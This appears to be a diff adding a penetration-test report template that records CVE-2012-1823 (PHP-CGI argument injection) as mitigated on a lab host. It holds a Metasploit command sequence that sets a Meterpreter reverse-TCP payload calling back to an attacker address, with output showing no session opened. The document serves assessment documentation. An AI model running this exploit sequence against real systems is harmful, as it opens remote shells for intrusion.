@@ -1,0 +1,28 @@
+Potential Vulnerability:
+
+	DESCRIPTION, CVE, PORT etc. GOES HERE
+
+
+The system is not exploitable, explain why the system is not exploitable
+by filling in the following as appropriate:
+
+
+	B: There appears to be a vulnerability, 
+		but the system is configured to mitigate
+		against it.
+		http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823
+		https://www.rapid7.com/db/modules/exploit/multi/http/php_cgi_arg_injection
+		https://www.cvedetails.com/cve/CVE-2012-1823/#metasploit
+		
+		Using msf:
+			1. use exploit/multi/http/php_cgi_arg_injection
+			2. set RHOST 192.168.0.100
+			3. set PAYLOAD php/meterpreter/reverse_tcp
+			4. set LHOST 192.168.0.129
+			5. exploit
+		Returned:
+			[*] Started reverse TCP handler on 192.168.0.129:4444 
+			[*] Exploit completed, but no session was created.
+		Mitigated using mod_cgi. Discovered using:
+			dpkg --get-selections | grep apache
+		
